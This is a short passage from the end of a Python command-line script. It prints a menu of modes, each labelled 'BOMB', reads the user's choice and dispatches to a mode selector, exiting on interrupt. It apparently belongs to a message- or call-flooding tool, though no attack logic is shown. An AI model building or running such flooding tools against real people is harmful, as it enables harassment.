                    print("[ {key} ] {value} BOMB".format(key=key,
                                                          value=value))
                print()
                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
main()
